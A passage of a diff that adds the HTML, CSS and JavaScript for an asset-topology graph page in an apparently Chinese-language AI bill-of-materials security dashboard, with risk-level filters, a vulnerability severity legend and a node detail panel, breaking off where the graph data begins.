@@ -1,0 +1,2187 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>资产图谱 - AIBOM Platform</title>
+  <link rel="stylesheet" href="common.css">
+  <style>
+    /* ── V1.81: bom-graph dark mode overrides ── */
+    html.dark .graph-info-bar {
+      background: rgba(26,29,39,0.97) !important;
+      border-color: var(--dm-border-color) !important;
+      box-shadow: 0 2px 6px rgba(0,0,0,.3) !important;
+    }
+    html.dark .graph-filter-panel {
+      background: rgba(26,29,39,0.97) !important;
+      border-color: var(--dm-border-color) !important;
+    }
+    html.dark .filter-section { border-color: var(--dm-border-color) !important; }
+    html.dark .filter-check-item input[type="checkbox"] {
+      background: var(--dm-bg-input) !important;
+      border-color: var(--dm-border-color) !important;
+    }
+    html.dark .graph-canvas-wrap { background: #0d1017 !important; }
+    html.dark .graph-grid-bg {
+      background-image: radial-gradient(circle, #2a3040 1px, transparent 1px) !important;
+      opacity: 0.7 !important;
+    }
+    html.dark .graph-toolbar button {
+      background: rgba(26,29,39,0.95) !important;
+      border-color: var(--dm-border-color) !important;
+      color: var(--dm-text-secondary) !important;
+      box-shadow: 0 2px 8px rgba(0,0,0,.4) !important;
+    }
+    html.dark .graph-toolbar button:hover {
+      border-color: var(--dm-primary) !important;
+      color: var(--dm-primary) !important;
+      background: var(--dm-primary-50) !important;
+    }
+    html.dark .graph-legend {
+      background: rgba(20,23,32,0.96) !important;
+      border-color: var(--dm-border-color) !important;
+      box-shadow: 0 2px 8px rgba(0,0,0,.4) !important;
+      color: var(--dm-text-secondary) !important;
+    }
+    html.dark .graph-legend-group-label { color: var(--dm-text-primary) !important; }
+    html.dark .graph-legend-sep { background: var(--dm-border-color) !important; }
+    html.dark .graph-zoom-indicator {
+      background: rgba(20,23,32,0.92) !important;
+      border-color: var(--dm-border-color) !important;
+      color: var(--dm-text-tertiary) !important;
+    }
+    html.dark .graph-breadcrumb {
+      background: var(--dm-bg-surface) !important;
+      border-color: var(--dm-border-color) !important;
+    }
+    html.dark .graph-detail-panel {
+      background: rgba(26,29,39,0.97) !important;
+      border-color: var(--dm-border-color) !important;
+    }
+    html.dark .detail-panel-header { border-color: var(--dm-border-color) !important; }
+    html.dark .detail-section { border-color: var(--dm-border-color) !important; }
+    html.dark .detail-tab-btn {
+      background: rgba(26,29,39,0.9) !important;
+      border-color: var(--dm-border-color) !important;
+      color: var(--dm-text-secondary) !important;
+    }
+    html.dark .detail-tab-btn.active {
+      background: var(--dm-primary) !important;
+      color: #fff !important;
+      border-color: var(--dm-primary) !important;
+    }
+    html.dark .code-copy-btn {
+      background: transparent !important;
+      border: none !important;
+      color: var(--dm-text-secondary) !important;
+    }
+    html.dark .kv-copy-btn {
+      background: transparent !important;
+      border: none !important;
+      color: var(--dm-text-secondary) !important;
+    }
+    html.dark .graph-center { background: #0d1017 !important; }
+    /* Legend icon boxes - keep colorful on dark */
+    html.dark .graph-legend-icon-box[style*="background:#EBF5FF"] { background: rgba(59,130,246,.2) !important; }
+    html.dark .graph-legend-icon-box[style*="background:#ECFDF5"] { background: rgba(16,185,129,.2) !important; }
+    html.dark .graph-legend-icon-box[style*="background:#F3EEFF"] { background: rgba(139,92,246,.2) !important; }
+    html.dark .graph-legend-icon-box[style*="background:#FFF7ED"] { background: rgba(245,158,11,.2) !important; }
+    html.dark .graph-legend-icon-box[style*="background:#FEF2F2"] { background: rgba(239,68,68,.2) !important; }
+    /* ===== [V1.5 FRAMEWORK KEEP] 页面整体布局框架 ===== */
+    .graph-page {
+      display: flex;
+      flex-direction: column;
+      height: calc(100vh - var(--header-height));
+    }
+
+    /* ===== [V1.3 BUSINESS] Info Bar ===== */
+    .graph-info-bar {
+      display: flex; align-items: center; gap: 20px;
+      padding: 10px 20px;
+      flex-shrink: 0; position: relative; z-index: 20;
+      background: rgba(255,255,255,0.9) !important;
+      backdrop-filter: blur(10px) !important;
+      -webkit-backdrop-filter: blur(10px) !important;
+      border-bottom: 1px solid var(--border-color) !important;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.04) !important;
+    }
+    .info-stats { display: flex; align-items: center; gap: 20px; }
+    .info-stat { display: flex; align-items: center; gap: 6px; font-size: 13px; color: var(--text-secondary); }
+    .info-val { font-size: 18px; font-weight: 700; font-family: var(--font-mono); color: var(--text-primary); letter-spacing: -0.5px; }
+    .info-val.danger { color: var(--danger); }
+    .info-divider { width: 1px; height: 24px; background: var(--border-color); }
+
+    /* ===== [V1.3 BUSINESS] Body layout ===== */
+    .graph-body { display: flex; flex: 1; min-height: 0; overflow: hidden; }
+
+    /* ===== [V1.3 BUSINESS] Left Filter Panel ===== */
+    .graph-filter-panel {
+      width: 240px; flex-shrink: 0;
+      background: rgba(255,255,255,0.9);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      border-right: 1px solid var(--border-color);
+      display: flex; flex-direction: column; overflow-y: auto;
+    }
+    .filter-section { padding: 14px 16px; border-bottom: 1px solid var(--border-color); }
+    .filter-section-title { font-size: 12px; font-weight: 600; color: var(--text-primary); margin-bottom: 10px; display: flex; align-items: center; gap: 6px; }
+    .filter-section-title i { font-size: 14px; color: var(--accent); }
+    .filter-check-list { display: flex; flex-direction: column; gap: 8px; }
+    .filter-check-item { display: flex; align-items: center; gap: 8px; cursor: pointer; font-size: 13px; color: var(--text-secondary); padding: 4px 0; }
+    .filter-check-item input[type="checkbox"] { appearance: none; width: 16px; height: 16px; border: 1px solid var(--border-color); background: var(--bg-surface); cursor: pointer; position: relative; flex-shrink: 0; }
+    .filter-check-item input[type="checkbox"]:checked { background: var(--accent); border-color: var(--accent); }
+    .filter-check-item input[type="checkbox"]:checked::after { content: ''; position: absolute; top: 3px; left: 5px; width: 4px; height: 8px; border: solid #fff; border-width: 0 2px 2px 0; transform: rotate(45deg); }
+    .filter-check-item .filter-dot { width: 8px; height: 8px; flex-shrink: 0; border-radius: 50%; }
+    .filter-check-item .filter-label { flex: 1; }
+    .filter-check-item .filter-count { font-size: 11px; font-family: var(--font-mono); color: var(--text-tertiary); }
+    .filter-actions { padding: 14px 16px; display: flex; gap: 8px; }
+    .filter-actions .btn { flex: 1; justify-content: center; }
+
+    /* ===== [V1.3 BUSINESS] Center Graph ===== */
+    .graph-center { flex: 1; display: flex; flex-direction: column; min-width: 0; position: relative; }
+    .graph-breadcrumb {
+      padding: 8px 16px; background: var(--bg-surface); border-bottom: 1px solid var(--border-color);
+      display: flex; align-items: center; gap: 6px; font-size: 12px; flex-shrink: 0;
+    }
+    .graph-breadcrumb a { color: var(--text-secondary); cursor: pointer; }
+    .graph-breadcrumb a:hover { color: var(--accent); }
+    .graph-breadcrumb span.sep { color: var(--text-tertiary); }
+    .graph-breadcrumb span.current { color: var(--accent); font-weight: 600; }
+    .graph-canvas-wrap { flex: 1; position: relative; overflow: hidden; background: #F8FAFC; }
+
+    /* ===== [V1.3 BUSINESS] SVG ===== */
+    #topologySvg { width: 100%; height: 100%; cursor: grab; }
+    #topologySvg:active { cursor: grabbing; }
+
+    /* Dot grid background */
+    .graph-grid-bg {
+      position: absolute; inset: 0; pointer-events: none;
+      background-image: radial-gradient(circle, #CBD5E1 1px, transparent 1px);
+      background-size: 30px 30px; opacity: 0.5;
+    }
+
+    /* ===== [V1.3 BUSINESS] Toolbar ===== */
+    .graph-toolbar {
+      position: absolute; bottom: 16px; right: 16px;
+      display: flex; gap: 4px; z-index: 10;
+    }
+    .graph-toolbar button {
+      width: 34px; height: 34px;
+      background: rgba(255,255,255,0.92); border: 1px solid var(--border-color);
+      display: flex; align-items: center; justify-content: center; cursor: pointer;
+      color: var(--text-secondary); font-size: 16px; transition: all 0.15s;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.06);
+    }
+    .graph-toolbar button:hover { border-color: var(--accent); color: var(--accent); background: var(--accent-dim); }
+
+    /* ===== [V1.3 BUSINESS] Legend (参考图片: 底部水平排列) ===== */
+    .graph-legend {
+      position: absolute; bottom: 14px; left: 14px;
+      display: flex; flex-wrap: nowrap; align-items: center; gap: 6px 10px;
+      font-size: 11px; color: var(--text-secondary);
+      background: rgba(255,255,255,0.92); padding: 7px 12px;
+      border: 1px solid var(--border-color);
+      z-index: 10; box-shadow: 0 2px 6px rgba(0,0,0,0.06);
+      white-space: nowrap; overflow-x: auto; max-width: calc(100% - 28px);
+    }
+    :root[data-theme="dark"] .graph-legend { background: rgba(17,28,46,0.92); }
+    .graph-legend-group-label { font-size: 10px; font-weight: 700; color: var(--text-primary); letter-spacing: 0.04em; padding: 0 2px; }
+    .graph-legend-sep { width: 1px; height: 14px; background: var(--border-color); flex-shrink: 0; }
+    .graph-legend-item { display: flex; align-items: center; gap: 4px; white-space: nowrap; }
+    .graph-legend-dot { width: 9px; height: 9px; flex-shrink: 0; border-radius: 50%; }
+    .graph-legend-line { width: 18px; height: 1px; flex-shrink: 0; }
+    .graph-legend-line.dashed { border-top: 1px dashed; height: 0; }
+    .graph-legend-icon-box { width: 16px; height: 16px; flex-shrink: 0; border-radius: 3px; display:flex; align-items:center; justify-content:center; }
+
+    /* ===== [V1.5 KEEP] Zoom indicator ===== */
+    .graph-zoom-indicator {
+      position: absolute; top: 12px; right: 16px; font-size: 11px;
+      font-family: var(--font-mono); color: var(--text-tertiary);
+      background: rgba(255,255,255,0.9); padding: 2px 8px;
+      border: 1px solid var(--border-color); z-index: 10;
+    }
+
+    /* ===== [V1.3 BUSINESS] Node Tooltip ===== */
+    .node-tooltip {
+      position: absolute; background: rgba(15,23,42,0.92); color: #fff;
+      padding: 10px 14px; font-size: 12px; line-height: 1.8;
+      border-radius: 6px; pointer-events: none; z-index: 200;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.2);
+      transform: translateY(-8px); transition: opacity 0.15s;
+      max-width: 240px; display: none;
+    }
+    .node-tooltip.show { display: block; }
+    .node-tooltip .tt-title { font-weight: 700; font-size: 13px; margin-bottom: 4px; }
+    .node-tooltip .tt-row { display: flex; gap: 8px; }
+    .node-tooltip .tt-label { color: rgba(255,255,255,0.6); flex-shrink: 0; }
+
+    /* ===== [V1.3 BUSINESS] Right Detail Panel ===== */
+    .graph-detail-panel {
+      width: 320px; flex-shrink: 0;
+      background: rgba(255,255,255,0.9);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      border-left: 1px solid var(--border-color);
+      display: flex; flex-direction: column; overflow: hidden;
+    }
+    .detail-panel-header {
+      padding: 14px 16px; border-bottom: 1px solid var(--border-color);
+      display: flex; align-items: center; justify-content: space-between; flex-shrink: 0;
+    }
+    .detail-panel-header .dp-title { font-size: 14px; font-weight: 600; color: var(--text-primary); display: flex; align-items: center; gap: 8px; }
+    .detail-panel-header .dp-title::before { content: ''; display: inline-block; width: 3px; height: 14px; background: var(--accent); }
+    .detail-panel-body { flex: 1; overflow-y: auto; }
+    .detail-empty { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 60px 24px; text-align: center; }
+    .detail-empty .empty-icon { font-size: 48px; color: var(--text-tertiary); opacity: 0.3; margin-bottom: 16px; }
+    .detail-empty .empty-text { font-size: 13px; color: var(--text-tertiary); line-height: 1.8; }
+    .detail-section { padding: 14px 16px; border-bottom: 1px solid var(--border-color); }
+    .detail-section-title { font-size: 12px; font-weight: 600; color: var(--text-primary); margin-bottom: 10px; display: flex; align-items: center; gap: 6px; }
+    .detail-section-title i { font-size: 13px; color: var(--accent); }
+    .detail-kv { display: flex; flex-direction: column; gap: 8px; }
+    .detail-kv-item { display: flex; align-items: flex-start; gap: 8px; }
+    .detail-kv-item.hidden { display: none; }
+    .kv-label { font-size: 12px; color: var(--text-tertiary); min-width: 72px; flex-shrink: 0; padding-top: 1px; }
+    .kv-expand-btn { display: flex; align-items: center; justify-content: center; gap: 4px; padding: 4px 0; font-size: 11px; color: var(--accent); cursor: pointer; margin-top: 4px; }
+    .kv-expand-btn:hover { color: var(--accent-hover); }
+    .kv-value { font-size: 13px; color: var(--text-primary); word-break: break-all; }
+    .kv-value.mono { font-family: var(--font-mono); font-size: 12px; }
+    .kv-value.with-copy { display: flex; align-items: center; gap: 6px; }
+    .kv-copy-btn { width: 22px; height: 22px; border: none; background: transparent; color: var(--text-tertiary); cursor: pointer; display: inline-flex; align-items: center; justify-content: center; padding: 0; flex-shrink: 0; border-radius: 6px; }
+    .kv-copy-btn:hover { background: rgba(148,163,184,0.5); color: var(--text-primary); }
+
+    .ip-kv { display: flex; align-items: center; gap: 6px; }
+    .ip-more-btn { background: var(--bg-surface); border: 1px solid var(--border-color); border-radius: 3px; font-size: 10px; color: var(--text-secondary); cursor: pointer; padding: 0 4px; display: inline-flex; align-items: center; justify-content: center; height: 16px; line-height: 1; }
+    .ip-more-btn:hover { border-color: var(--accent); color: var(--accent); }
+    .ip-popover { display: none; position: absolute; top: 100%; left: 0; background: var(--bg-surface); border: 1px solid var(--border-color); border-radius: 4px; padding: 4px 0; min-width: 140px; max-width: 200px; z-index: 10; box-shadow: 0 4px 12px rgba(0,0,0,0.15); margin-top: 4px; }
+    .ip-popover.show { display: block; }
+    .ip-popover-item { padding: 4px 12px; font-size: 12px; display: flex; align-items: center; gap: 6px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .ip-popover-item:hover { background: var(--bg-hover); }
+
+    .detail-metrics { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin-top: 8px; }
+    .detail-metric { background: var(--bg-surface-alt); border: 1px solid var(--border-color); padding: 10px; text-align: center; }
+    .detail-metric .dm-val { font-size: 18px; font-weight: 700; font-family: var(--font-mono); color: var(--text-primary); line-height: 1.2; }
+    .detail-metric .dm-val.danger { color: var(--danger); }
+    .detail-metric .dm-val.accent { color: var(--accent); }
+    .detail-metric .dm-label { font-size: 10px; color: var(--text-tertiary); margin-top: 2px; }
+    .vuln-list-item { padding: 10px 16px; border-bottom: 1px solid var(--border-color); cursor: pointer; transition: background 0.15s; }
+    .vuln-list-item:hover { background: var(--bg-hover); }
+    .vuln-list-item .vuln-title { font-size: 12px; font-weight: 600; color: var(--text-primary); margin-bottom: 4px; display: flex; align-items: center; gap: 6px; flex-wrap: wrap; }
+    .vuln-list-item .vuln-meta { display: flex; align-items: center; gap: 8px; font-size: 11px; color: var(--text-tertiary); }
+    .assoc-item { padding: 10px 16px; border-bottom: 1px solid var(--border-color); display: flex; align-items: center; gap: 10px; cursor: pointer; transition: background 0.15s; }
+    .assoc-item:hover { background: var(--bg-hover); }
+    .assoc-item .assoc-icon { width: 28px; height: 28px; display: flex; align-items: center; justify-content: center; font-size: 14px; flex-shrink: 0; }
+    .assoc-item .assoc-info { flex: 1; min-width: 0; }
+    .assoc-item .assoc-name { font-size: 13px; font-weight: 600; color: var(--text-primary); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+    .assoc-item .assoc-type { font-size: 11px; color: var(--text-tertiary); }
+
+    /* ===== [V1.5 KEEP] Net tag ===== */
+    .net-tag { font-size: 10px; padding: 1px 6px; border-radius: 3px; font-weight: 600; display: inline-block; }
+    .net-tag.internal { background: #EBF5FF; color: #1d4ed8; border: 1px solid #bfdbfe; }
+    .net-tag.external { background: #FFF3E0; color: #c2410c; border: 1px solid #fed7aa; }
+
+    .detail-tabs { display: flex; gap: 6px; padding: 12px 16px 0; flex-wrap: wrap; }
+    .detail-tab-btn { border: 1px solid var(--border-color); background: rgba(255,255,255,0.9); color: var(--text-secondary); font-size: 12px; padding: 6px 10px; cursor: pointer; transition: all .15s; }
+    .detail-tab-btn:hover { border-color: var(--accent); color: var(--accent); background: var(--accent-dim); }
+    .detail-tab-btn.active { border-color: var(--accent); color: var(--accent); background: var(--accent-dim); font-weight: 600; }
+    .detail-tab-panels { padding: 10px 0 0; }
+    .detail-tab-panel { display: none; }
+    .detail-tab-panel.active { display: block; }
+
+    .ip-kv { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+    .ip-more-btn { border: 1px solid var(--border-color); background: var(--bg-surface); color: var(--text-tertiary); cursor: pointer; padding: 0 6px; height: 20px; line-height: 18px; font-size: 14px; }
+    .ip-more-btn:hover { border-color: var(--accent); color: var(--accent); }
+    .ip-popover { position: absolute; right: 0; top: calc(100% + 6px); width: 240px; background: var(--bg-surface); border: 1px solid var(--border-color); box-shadow: var(--shadow-lg); z-index: 400; padding: 10px; display: none; }
+    .ip-popover.show { display: block; }
+    .ip-popover-item { display: flex; align-items: center; gap: 8px; padding: 6px 6px; border-radius: 6px; }
+    .ip-popover-item:hover { background: var(--bg-hover); }
+    .ip-popover-item .mono { font-family: var(--font-mono); font-size: 12px; color: var(--text-primary); }
+
+    .badge-primary { background: #EEF2FF; color: #4338CA; border: 1px solid #C7D2FE; }
+
+    .code-block-wrap { position: relative; }
+    .code-copy-btn { position: absolute; top: 8px; right: 8px; width: 22px; height: 22px; border: none; background: transparent; color: var(--text-tertiary); cursor: pointer; z-index: 2; display: inline-flex; align-items: center; justify-content: center; padding: 0; border-radius: 6px; }
+    .code-copy-btn:hover { background: rgba(148,163,184,0.5); color: var(--text-primary); }
+    .code-block { background: #0b1220; color: #E2E8F0; border: 1px solid rgba(148,163,184,0.25); border-radius: 8px; padding: 34px 12px 12px 12px; overflow: auto; font-family: var(--font-mono); font-size: 11px; line-height: 1.6; white-space: pre; position: relative; }
+
+    #bgGlowCircle.focus-glow { animation: focusGlow 0.65s ease-out; }
+    @keyframes focusGlow { 0% { opacity: 0.1; } 55% { opacity: 0.75; } 100% { opacity: 0.2; } }
+
+    /* ===== [V1.3 BUSINESS] SVG Animations ===== */
+    @keyframes nodeFadeIn { from { opacity:0; transform:scale(0.6); } to { opacity:1; transform:scale(1); } }
+    @keyframes edgeGrow { from { stroke-dashoffset:200; } to { stroke-dashoffset:0; } }
+    @keyframes pulseRing { 0% { r:32; opacity:0.7; } 100% { r:48; opacity:0; } }
+    @keyframes floatUp { 0%,100% { transform:translateY(0); } 50% { transform:translateY(-4px); } }
+    @keyframes dashFlow { from { stroke-dashoffset:18; } to { stroke-dashoffset:0; } }
+    .node-enter { animation: nodeFadeIn 0.4s ease forwards; }
+    .edge-enter { animation: none; }
+    .edge-flow { animation: dashFlow 0.8s linear infinite; }
+  </style>
+</head>
+<body>
+<div class="layout">
+  <aside class="sidebar" id="sidebar"></aside>
+  <div class="main">
+    <header class="header" id="header"></header>
+
+    <!-- ===== [V1.3 BUSINESS] 资产图谱主体（替换 v1.5 静态 SVG）===== -->
+    <div class="graph-page">
+
+      <!-- Info Bar -->
+      <div class="graph-info-bar">
+        <div class="info-stats">
+          <div class="info-stat">
+            <i class="ri-server-line" style="font-size:16px;color:var(--accent);"></i>
+            <span>总资产数</span>
+            <span class="info-val">1,284</span>
+          </div>
+          <div class="info-divider"></div>
+          <div class="info-stat">
+            <i class="ri-shield-flash-line" style="font-size:16px;color:var(--danger);"></i>
+            <span>风险资产数</span>
+            <span class="info-val danger">326</span>
+          </div>
+        </div>
+        <!-- Search -->
+        <div style="margin-left:auto;position:relative;">
+          <i class="ri-search-line" style="position:absolute;left:9px;top:50%;transform:translateY(-50%);color:var(--text-tertiary);font-size:14px;pointer-events:none;"></i>
+          <input type="text" id="graphSearchInput" placeholder="系统名称 / 关联主机IP / 组件名称"
+            style="padding:5px 10px 5px 30px;border:1px solid var(--border-color);background:var(--bg-input);color:var(--text-primary);font-size:12px;width:240px;font-family:var(--font-sans);outline:none;transition:border-color .2s;"
+            onfocus="this.style.borderColor='var(--accent)'" onblur="this.style.borderColor='var(--border-color)'"
+            oninput="onGraphSearch(this.value)">
+          <div id="graphSearchResults" style="display:none;position:absolute;top:calc(100% + 4px);right:0;width:300px;background:var(--bg-surface);border:1px solid var(--border-color);box-shadow:var(--shadow-lg);z-index:300;max-height:240px;overflow-y:auto;"></div>
+        </div>
+      </div>
+
+      <!-- Body -->
+      <div class="graph-body">
+
+        <!-- Left Filter Panel -->
+        <div class="graph-filter-panel">
+          <div class="filter-section">
+            <div class="filter-section-title"><i class="ri-stack-line"></i> 资产类型筛选</div>
+            <div class="filter-check-list">
+              <label class="filter-check-item"><input type="checkbox" checked data-type="system"><span class="filter-label">系统</span><span class="filter-count">24</span></label>
+              <label class="filter-check-item"><input type="checkbox" checked data-type="app"><span class="filter-label">应用</span><span class="filter-count">156</span></label>
+              <label class="filter-check-item"><input type="checkbox" checked data-type="container"><span class="filter-label">容器</span><span class="filter-count">89</span></label>
+              <label class="filter-check-item"><input type="checkbox" checked data-type="model"><span class="filter-label">模型</span><span class="filter-count">15</span></label>
+            </div>
+          </div>
+          <div class="filter-section">
+            <div class="filter-section-title"><i class="ri-shield-flash-line"></i> 风险等级筛选</div>
+            <div class="filter-check-list">
+              <label class="filter-check-item"><input type="checkbox" checked data-risk="critical"><span class="filter-dot" style="background:var(--purple);"></span><span class="filter-label">严重</span><span class="filter-count">18</span></label>
+              <label class="filter-check-item"><input type="checkbox" checked data-risk="high"><span class="filter-dot" style="background:var(--danger);"></span><span class="filter-label">高危</span><span class="filter-count">47</span></label>
+              <label class="filter-check-item"><input type="checkbox" checked data-risk="medium"><span class="filter-dot" style="background:var(--warning);"></span><span class="filter-label">中危</span><span class="filter-count">93</span></label>
+              <label class="filter-check-item"><input type="checkbox" checked data-risk="low"><span class="filter-dot" style="background:var(--success);"></span><span class="filter-label">低危</span><span class="filter-count">112</span></label>
+              <label class="filter-check-item"><input type="checkbox" checked data-risk="none"><span class="filter-dot" style="background:#CBD5E1;"></span><span class="filter-label">无风险</span><span class="filter-count">0</span></label>
+            </div>
+          </div>
+          <div class="filter-actions">
+            <button class="btn btn-primary btn-sm" id="btnApplyFilter"><i class="ri-filter-3-line"></i> 应用</button>
+            <button class="btn btn-secondary btn-sm" id="btnResetFilter"><i class="ri-refresh-line"></i> 重置</button>
+          </div>
+        </div>
+
+        <!-- Center Graph -->
+        <div class="graph-center">
+          <div class="graph-breadcrumb" id="graphBreadcrumb">
+            <i class="ri-mind-map" style="font-size:13px;color:var(--text-tertiary);"></i>
+            <span class="current">资产图谱</span>
+          </div>
+          <div class="graph-canvas-wrap">
+            <div class="graph-grid-bg"></div>
+
+            <!-- ===== [V1.3 BUSINESS] Topology SVG ===== -->
+            <svg id="topologySvg" width="100%" height="100%" style="overflow:visible;">
+              <defs>
+                <marker id="arrowContain" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                  <path d="M 0 0 L 10 5 L 0 10 z" fill="#94a3b8"/>
+                </marker>
+                <marker id="arrowDepend" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                  <path d="M 0 0 L 10 5 L 0 10 z" fill="#8B5CF6"/>
+                </marker>
+                <filter id="nodeShadow" x="-50%" y="-50%" width="200%" height="200%">
+                  <feDropShadow dx="0" dy="4" stdDeviation="3" flood-color="rgba(0,0,0,0.1)"/>
+                </filter>
+                <filter id="nodeGlowBlur" x="-80%" y="-80%" width="260%" height="260%">
+                  <feGaussianBlur stdDeviation="6" result="blur"/>
+                  <feMerge>
+                    <feMergeNode in="blur"/>
+                    <feMergeNode in="SourceGraphic"/>
+                  </feMerge>
+                </filter>
+                <radialGradient id="bgGlow" cx="50%" cy="50%" r="50%">
+                  <stop offset="0%" stop-color="rgba(8,145,178,0.08)"/>
+                  <stop offset="100%" stop-color="rgba(8,145,178,0)"/>
+                </radialGradient>
+              </defs>
+              <circle id="bgGlowCircle" cx="50%" cy="50%" r="200" fill="url(#bgGlow)" opacity="0.5"/>
+              <g id="edgesLayer"></g>
+              <g id="nodesLayer"></g>
+            </svg>
+
+            <div class="graph-zoom-indicator" id="zoomIndicator">100%</div>
+            <div class="graph-toolbar">
+              <button title="放大" onclick="changeZoom(1.2)"><i class="ri-zoom-in-line"></i></button>
+              <button title="缩小" onclick="changeZoom(0.83)"><i class="ri-zoom-out-line"></i></button>
+              <button title="还原" onclick="resetView()"><i class="ri-focus-3-line"></i></button>
+              <button title="回到根节点" onclick="drillTo(null)"><i class="ri-home-4-line"></i></button>
+            </div>
+
+            <!-- Legend -->
+            <div class="graph-legend">
+              <span class="graph-legend-group-label">资产</span>
+              <div class="graph-legend-item">
+                <div class="graph-legend-icon-box" style="background:#EBF5FF;border:1.5px solid #3B82F6;"><i class="ri-server-line" style="color:#3B82F6;font-size:10px;"></i></div>
+                <span>系统</span>
+              </div>
+              <div class="graph-legend-item">
+                <div class="graph-legend-icon-box" style="background:#ECFDF5;border:1.5px solid #10B981;"><i class="ri-apps-line" style="color:#10B981;font-size:10px;"></i></div>
+                <span>应用</span>
+              </div>
+              <div class="graph-legend-item">
+                <div class="graph-legend-icon-box" style="background:#F3EEFF;border:1.5px solid #8B5CF6;"><i class="ri-layout-grid-line" style="color:#8B5CF6;font-size:10px;"></i></div>
+                <span>容器</span>
+              </div>
+              <div class="graph-legend-item">
+                <div class="graph-legend-icon-box" style="background:#FFFBEB;border:1.5px solid #F59E0B;"><i class="ri-brain-line" style="color:#F59E0B;font-size:10px;"></i></div>
+                <span>模型</span>
+              </div>
+              <div class="graph-legend-item">
+                <div class="graph-legend-icon-box" style="background:#E0FFFE;border:1.5px solid #06B6D4;"><i class="ri-code-box-line" style="color:#06B6D4;font-size:10px;"></i></div>
+                <span>组件</span>
+              </div>
+              <div class="graph-legend-sep"></div>
+              <span class="graph-legend-group-label">漏洞</span>
+              <div class="graph-legend-item"><div class="graph-legend-dot" style="background:#722ED1;"></div><span>严重</span></div>
+              <div class="graph-legend-item"><div class="graph-legend-dot" style="background:#F53F3F;"></div><span>高危</span></div>
+              <div class="graph-legend-item"><div class="graph-legend-dot" style="background:#FF7D00;"></div><span>中危</span></div>
+              <div class="graph-legend-item"><div class="graph-legend-dot" style="background:#00B42A;"></div><span>低危</span></div>
+              <div class="graph-legend-sep"></div>
+              <span class="graph-legend-group-label">关系</span>
+              <div class="graph-legend-item"><div class="graph-legend-line" style="background:#94a3b8;"></div><span>包含/存在</span></div>
+              <div class="graph-legend-item"><div class="graph-legend-line dashed" style="border-color:#8B5CF6;"></div><span>依赖/使用</span></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Right Detail Panel -->
+        <div class="graph-detail-panel" id="detailPanel">
+          <div class="detail-panel-header">
+            <div class="dp-title" id="detailPanelTitle">资产详情</div>
+            <button class="btn btn-ghost btn-xs" onclick="closeDetail()" title="关闭" style="font-size:16px;padding:2px 6px;"><i class="ri-close-line"></i></button>
+          </div>
+          <div class="detail-panel-body">
+            <div class="detail-empty" id="detailEmpty">
+              <div class="empty-icon"><i class="ri-mind-map"></i></div>
+              <div class="empty-text">未选择节点，请在拓扑图中点击任意资产节点，查看该资产的详细信息、组件及风险情况</div>
+            </div>
+            <div id="detailContent" style="display:none;"></div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Hover Tooltip -->
+<div class="node-tooltip" id="nodeTooltip">
+  <div class="tt-title" id="ttTitle"></div>
+  <div class="tt-row"><span class="tt-label">类型:</span><span id="ttType"></span></div>
+  <div class="tt-row"><span class="tt-label">风险:</span><span id="ttRisk"></span></div>
+  <div class="tt-row" id="ttHostRow"><span class="tt-label">关联主机名:</span><span id="ttHost"></span></div>
+  <div class="tt-row" id="ttIpRow"><span class="tt-label">关联主机IP:</span><span id="ttIp" style="font-family:monospace;"></span></div>
+</div>
+
+<!-- [V1.5 KEEP] Common script -->
+<script src="common.js"></script>
+<script>
+  /* ===========================================================
+   * [V1.5 FRAMEWORK] initPage — 保持 v1.5 平台框架初始化调用
+   * =========================================================== */
+  document.addEventListener('DOMContentLoaded', function() {
+    initPage('graph', [{label:'资产图谱'}]);
+    initGraph();
+    // Re-render graph when dark mode toggles so node colors update
+    const _origToggle = window.toggleTheme;
+    window.toggleTheme = function() { _origToggle(); setTimeout(initGraph, 50); };
+    // Filter buttons
+    document.getElementById('btnApplyFilter').addEventListener('click', function() {
+      const checked = Array.from(document.querySelectorAll('.filter-check-item input[data-type]:checked')).map(cb => cb.dataset.type);
+      const checkedRisks = Array.from(document.querySelectorAll('.filter-check-item input[data-risk]:checked')).map(cb => cb.dataset.risk);
+      document.querySelectorAll('#nodesLayer g[data-type]').forEach(g => {
+        const t = g.dataset.type;
+        const r = g.dataset.risk || 'none';
+        const okType = (!checked.length || checked.includes(t) || t === 'vuln');
+        const okRisk = (!checkedRisks.length || checkedRisks.includes(r));
+        g.style.opacity = (okType && okRisk) ? '1' : '0.1';
+      });
+    });
+    document.getElementById('btnResetFilter').addEventListener('click', function() {
+      document.querySelectorAll('.filter-check-item input[type="checkbox"]').forEach(cb => cb.checked = true);
+      document.querySelectorAll('#nodesLayer g').forEach(g => g.style.opacity = '1');
+    });
+    // Close search on outside click
+    document.addEventListener('click', function(e) {
+      const sr = document.getElementById('graphSearchResults');
+      const inp = document.getElementById('graphSearchInput');
+      if (sr && inp && !sr.contains(e.target) && e.target !== inp) sr.style.display = 'none';
+    });
+  });
+
+  /* ===========================================================
+   * [V1.3 BUSINESS] GRAPH DATA — 完整数据结构
+   * =========================================================== */
+  const GRAPH_DATA = {
+    nodes: {
+      // 8 Root System nodes (参考图片节点名+IP)
